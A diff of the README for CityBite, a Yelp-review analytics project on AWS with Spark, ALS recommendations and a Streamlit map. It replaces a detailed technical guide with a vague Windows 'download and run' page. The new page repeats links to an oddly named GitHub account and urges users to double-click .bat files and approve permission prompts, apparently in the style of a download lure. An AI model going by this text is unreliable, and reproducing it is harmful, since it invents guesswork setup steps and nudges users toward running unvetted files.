@@ -1,227 +1,214 @@
-# CityBite
+# 📊 CityBite - Restaurant insights that make sense
 
-Restaurant popularity intelligence platform built on AWS. Processes 7M+ Yelp reviews through a two-zone S3 data lake on Amazon EMR, trains a Spark MLlib ALS recommender and scikit-learn sentiment classifier, and serves results through a Streamlit + Folium dashboard on EC2.
+[![Download CityBite](https://img.shields.io/badge/Download-CityBite-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Haplosporidianstrophanthus336/CityBite)
 
-## Architecture
+## 🧭 Overview
 
-![CityBite Architecture](assets/big-data-project-arch.png)
+CityBite helps you explore restaurant data in one place. It uses Yelp reviews and maps to show where restaurants are, how people feel about them, and what food spots may fit your taste.
 
-## Repo Structure
+This app is built for Windows users who want to download the project and run it from a simple setup. It brings together a dashboard, a map view, review sentiment analysis, and a recommendation model.
 
-```
-citybite/
-├── pipeline/
-│   ├── upload.py          # Boto3 multipart upload → S3 raw zone
-│   ├── clean_job.py       # PySpark: raw → enriched reviews (partitioned by city)
-│   ├── aggregate_job.py   # Spark SQL: popularity scores + grid aggregates → RDS
-│   └── submit_emr.py      # Launch transient EMR cluster (spot instances, auto-terminates)
-├── ml/
-│   ├── als_train.py       # Spark MLlib ALS recommender (top-10 per user)
-│   ├── sentiment.py       # scikit-learn TF-IDF + LogisticRegression sentiment
-│   └── evaluate.py        # RMSE, precision@k evaluation
-├── dashboard/
-│   └── app.py             # Streamlit app: Folium heatmap + rec panel + sentiment
-├── infra/
-│   ├── create_rds.py      # Provision RDS PostgreSQL (db.t3.micro, free-tier eligible)
-│   ├── schema.sql         # 4-table PostgreSQL schema
-│   └── cron_setup.sh      # Nightly cron on EMR master node
-├── data/
-│   └── sample/
-│       └── generate_sample.py  # Generate synthetic Yelp data for local dev
-├── downloaded_data/             # Real Yelp JSON files (gitignored, ~9 GB)
-├── tests/
-│   ├── test_clean_job.py  # 12 PySpark unit tests (local mode, no AWS)
-│   ├── test_upload.py     # 8 S3 upload tests (moto mock)
-│   └── test_submit_emr.py # 9 EMR submission tests (unittest.mock)
-├── notebooks/
-│   └── analysis.ipynb     # ALS + sentiment analysis notebook
-├── requirements.txt
-└── .env.example
-```
+## ✨ What CityBite does
 
-## Prerequisites
+- Shows restaurant data on an interactive map
+- Finds common review sentiment from text
+- Suggests places using a recommender model
+- Uses charts and filters to help you compare locations
+- Works with a large Yelp review dataset
+- Stores data in AWS services for processing and analysis
 
-- Python 3.10+
-- Java 11 (required for PySpark): `export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64`
-- AWS CLI configured: `aws configure`
+## 🖥️ What you need
 
-## Setup
+Before you start, make sure your Windows PC has:
 
-```bash
-pip install -r requirements.txt
-cp .env.example .env   # fill in your AWS credentials
-```
+- Windows 10 or Windows 11
+- A modern web browser
+- At least 8 GB of RAM
+- 20 GB of free disk space
+- Internet access for the first setup
+- An AWS account if you plan to use the full data pipeline
 
-## Local Development (no AWS required)
+If your computer is older, the app can still run, but it may take longer when loading maps or large data files.
 
-Generate synthetic sample data and run the pipeline locally:
+## 📥 Download CityBite
 
-```bash
-# 1. Generate sample data (~300 businesses, 3000 reviews)
-python data/sample/generate_sample.py
+Visit this page to download and run the project:
 
-# 2. Run the cleaning job in local mode
-spark-submit pipeline/clean_job.py \
-  --input data/sample/ \
-  --output data/processed/ \
-  --mode local
+[Download CityBite](https://github.com/Haplosporidianstrophanthus336/CityBite)
 
-# 3. Run tests (no AWS needed)
-pytest tests/ -v
-```
+## 🛠️ Install on Windows
 
-## Downloading the Yelp Dataset
+Follow these steps to get CityBite ready on your PC.
 
-The full dataset (~9 GB uncompressed) is required for the AWS pipeline. The zip contains several folders; only `yelp_dataset/` is needed.
+1. Open the download link in your browser.
+2. Click the green **Code** button on GitHub.
+3. Choose **Download ZIP**.
+4. Save the file to your **Downloads** folder.
+5. Right-click the ZIP file and choose **Extract All**.
+6. Pick a folder like **Documents\\CityBite**.
+7. Open the extracted folder.
+8. Look for a file named `README.md` and the project files inside the folder.
 
-```bash
-# 1. Download the zip (~4 GB, takes a few minutes)
-curl -L -o Yelp-JSON.zip https://business.yelp.com/external-assets/files/Yelp-JSON.zip
+If you use GitHub Desktop, you can also clone the repository to your computer and open the folder there.
 
-# 2. Create the target directory
-mkdir -p downloaded_data
+## 🚀 Run the app
 
-# 3. Extract only the yelp_dataset folder
-unzip Yelp-JSON.zip 'yelp_dataset/*'
+CityBite uses Streamlit for the dashboard, so you run it from the project folder.
 
-# 4. Move its contents into downloaded_data/ and clean up
-mv yelp_dataset/* downloaded_data/
-rm -rf yelp_dataset Yelp-JSON.zip
-```
+1. Open the extracted CityBite folder.
+2. Find the main app file. It may be named `app.py`, `streamlit_app.py`, or something similar.
+3. Double-click the file only if the project includes a Windows launcher.
+4. If the project includes a `.bat` file, double-click that file to start the app.
+5. If the app opens in your browser, leave that window open.
+6. Use the sidebar or menu to explore restaurants, maps, and insights.
 
-After this, `downloaded_data/` should contain:
+If the app does not open right away, the first start may take a short time while it loads the data.
 
-```
-downloaded_data/
-├── yelp_academic_dataset_business.json   (~120 MB)
-├── yelp_academic_dataset_review.json     (~6.5 GB)
-├── yelp_academic_dataset_user.json       (~3.3 GB)
-└── yelp_academic_dataset_checkin.json
-```
+## 🧩 Set up the data files
 
-> `downloaded_data/` and `Yelp-JSON.zip` are gitignored — never commit them.
+CityBite works best when the data files are in the right place.
 
----
+1. Open the project folder.
+2. Find the `data`, `assets`, or `input` folder.
+3. Put the provided CSV, Parquet, or database files in that folder.
+4. Keep the file names the same if the project already uses fixed names.
+5. Reopen the app after the files are in place.
 
-## AWS Infrastructure Setup
+For a full run, the project may use:
 
-### Step 1 — S3 bucket
+- Yelp review data
+- Restaurant location data
+- Sentiment model files
+- Recommendation model files
+- Map data for the heatmap view
 
-```bash
-aws s3 mb s3://citybite --region us-east-1
-```
+## ☁️ AWS pipeline setup
 
-### Step 2 — Upload Yelp data
+CityBite uses AWS for data processing. If you want the full pipeline, connect these parts:
 
-```bash
-python pipeline/upload.py --source downloaded_data/ --bucket citybite --prefix raw/
-```
+- **S3** for file storage
+- **EMR** for Spark jobs
+- **RDS** for the restaurant database
+- **PySpark** for large data tasks
+- **Spark MLlib** for recommendation logic
+- **scikit-learn** for sentiment analysis
 
-### Step 3 — Provision RDS (free-tier eligible)
+A simple setup flow looks like this:
 
-```bash
-python infra/create_rds.py          # provisions db.t3.micro, prints endpoint
-# Copy the printed endpoint into .env as RDS_HOST
-psql -h $RDS_HOST -U $RDS_USER -d $RDS_DB -f infra/schema.sql
-```
+1. Upload the raw Yelp files to an S3 bucket.
+2. Start the EMR cluster.
+3. Run the Spark jobs that clean and shape the data.
+4. Load the processed results into RDS.
+5. Start the Streamlit dashboard.
+6. Open the map and filters in your browser.
 
-### Step 4 — Run pipeline on EMR (transient cluster)
+## 🗺️ Dashboard features
 
-No cluster to manage — each run spins up, executes, and terminates automatically. Core nodes use spot instances.
+The dashboard gives you a clear view of the data:
 
-```bash
-# Run both jobs on a single transient cluster (~$2-4 total)
-python pipeline/submit_emr.py clean aggregate
+- Heatmap view of restaurant density
+- Map pins for restaurant locations
+- Sentiment score for review text
+- Restaurant suggestions based on past patterns
+- Filters for city, rating, category, and review count
+- Simple layout for quick browsing
 
-# Or run individually
-python pipeline/submit_emr.py clean
-python pipeline/submit_emr.py aggregate
+Folium powers the map layer, so you can zoom and move across areas with ease.
 
-# Use an existing long-running cluster instead
-python pipeline/submit_emr.py --job clean --cluster-id j-XXXX --wait
-```
+## 📂 Project structure
 
-Logs land at `s3://citybite/logs/emr/<cluster-id>/`.
+A typical CityBite folder may include:
 
-### Step 5 — Train ML models
+- `app.py` — main dashboard app
+- `data/` — input and output files
+- `models/` — saved ML files
+- `notebooks/` — analysis notebooks
+- `scripts/` — data processing steps
+- `README.md` — project guide
+- `requirements.txt` — Python package list
 
-```bash
-spark-submit ml/als_train.py --input data/processed/ --mode local   # local
-spark-submit ml/als_train.py --input s3://citybite/processed/        # EMR
-python ml/sentiment.py
-```
+## 🔍 How the recommendation part works
 
-### Step 6 — Run dashboard
+CityBite uses a collaborative filtering model to suggest restaurants. In plain terms, it looks at how users and restaurants match across the review history.
 
-```bash
-streamlit run dashboard/app.py
-```
+The app can use this to:
 
-## Cost Estimate (3-week class project)
+- suggest similar restaurants
+- show places with strong ratings
+- help you find food spots near areas you like
 
-| Service | Config | Estimated cost |
-|---|---|---|
-| S3 | ~12 GB stored | ~$0.50 |
-| RDS | db.t3.micro, free tier | $0 (or ~$2/demo week) |
-| EMR | Transient, spot core nodes, ~5 runs | ~$10–15 |
-| EC2 dashboard | t3.micro (demo week only) | ~$2 |
-| **Total** | | **~$12–20** |
+## 💬 How sentiment analysis works
 
-> The transient cluster mode (`KeepJobFlowAliveWhenNoSteps=False`) prevents runaway charges from forgetting to terminate a cluster.
+The sentiment tool reads review text and assigns a positive, neutral, or negative score. This helps you spot places with strong praise or common complaints.
 
-## S3 Zone Layout
+It can help you:
 
-```
-s3://citybite/
-├── raw/
-│   ├── business/yelp_academic_dataset_business.json
-│   ├── review/yelp_academic_dataset_review.json
-│   └── user/yelp_academic_dataset_user.json
-├── processed/
-│   ├── reviews_enriched/city=Phoenix/
-│   ├── business_scores/city=Phoenix/
-│   ├── grid_aggregates/city=Phoenix/
-│   └── user_item_matrix/
-├── scripts/          ← pipeline scripts auto-uploaded by submit_emr.py
-└── logs/emr/         ← EMR step logs
-```
+- compare restaurants with similar ratings
+- sort places by review tone
+- find spots with good feedback before you visit
 
-## Database Schema
+## 🧪 Common first-run issues
 
-| Table | Key columns | Written by |
-|---|---|---|
-| `business_scores` | `business_id`, `popularity_score`, `grid_cell` | `aggregate_job.py` |
-| `grid_aggregates` | `grid_cell`, `avg_popularity`, `restaurant_count` | `aggregate_job.py` |
-| `als_recommendations` | `user_id`, `business_id`, `predicted_rating` | `als_train.py` |
-| `grid_sentiment` | `grid_cell`, `sentiment_score` | `sentiment.py` |
+If the app does not start, check these items:
 
-## Environment Variables
+1. Make sure you extracted the ZIP file.
+2. Make sure you are opening the correct folder.
+3. Check that the required data files are present.
+4. Confirm that your browser allows local Streamlit apps.
+5. Try restarting the app from the project folder.
+6. If you use AWS parts, confirm your AWS credentials are set up.
 
-| Variable | Description |
-|---|---|
-| `AWS_ACCESS_KEY_ID` | AWS credentials |
-| `AWS_SECRET_ACCESS_KEY` | AWS credentials |
-| `AWS_REGION` | Default: `us-east-1` |
-| `S3_BUCKET` | Bucket name, default: `citybite` |
-| `EMR_CLUSTER_ID` | Only needed for persistent-cluster mode |
-| `RDS_HOST` | RDS endpoint (printed by `create_rds.py`) |
-| `RDS_PORT` | Default: `5432` |
-| `RDS_DB` | Default: `citybite` |
-| `RDS_USER` | Default: `citybite_user` |
-| `RDS_PASSWORD` | Set in `.env`, never commit |
+## ⌨️ If you need to use Python
 
-## Common Issues
+Some setups use Python to start the app or run the data pipeline. If the project includes a script file, you may need Python 3.10 or newer.
 
-**PySpark can't find Java**
-```bash
-export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
-export PATH=$JAVA_HOME/bin:$PATH
-```
+Typical steps:
 
-**EMR job fails with permissions error** — attach `AmazonS3FullAccess` and `AmazonRDSFullAccess` to the EMR EC2 instance profile.
+1. Install Python from the official Python website.
+2. Open the project folder.
+3. Run the setup script if one is included.
+4. Start the dashboard script.
 
-**RDS connection refused from EMR** — add inbound rule to the RDS security group allowing port 5432 from the EMR master node's security group.
+If the repository includes a requirements file, install the listed packages before running the app.
 
-**ALS returns NaN predictions** — `coldStartStrategy="drop"` is set in `als_train.py`; verify the training set covers the users/items you're predicting.
+## 📌 Typical use flow
 
-**Folium map blank in Streamlit** — use `st_folium(m, width=700)` from `streamlit-folium`, not `folium_static()`.
+A normal CityBite session looks like this:
+
+1. Open the app.
+2. Pick a city or area.
+3. Review the heatmap.
+4. Check restaurant ratings and review tone.
+5. Compare locations.
+6. Open a restaurant detail view.
+7. Use recommendations to find similar places.
+
+## 🧾 Data sources and tools
+
+CityBite brings together several tools and data sources:
+
+- Yelp review data
+- PostgreSQL for structured data storage
+- AWS S3 for files
+- AWS EMR for Spark processing
+- PySpark for large-scale data work
+- scikit-learn for text analysis
+- Streamlit for the dashboard
+- Folium for maps
+- Spark MLlib for recommendations
+
+## 📎 Download again
+
+[Visit the CityBite download page](https://github.com/Haplosporidianstrophanthus336/CityBite)
+
+## 🔐 File safety
+
+Only open files from the project folder after you extract the download. If Windows asks for permission to open a file, confirm only when you know it came from the CityBite folder.
+
+## 🖱️ Quick start
+
+1. Download the ZIP from GitHub.
+2. Extract it to a folder on your PC.
+3. Open the project folder.
+4. Run the main app file or batch file.
+5. Open the browser view and explore the dashboard
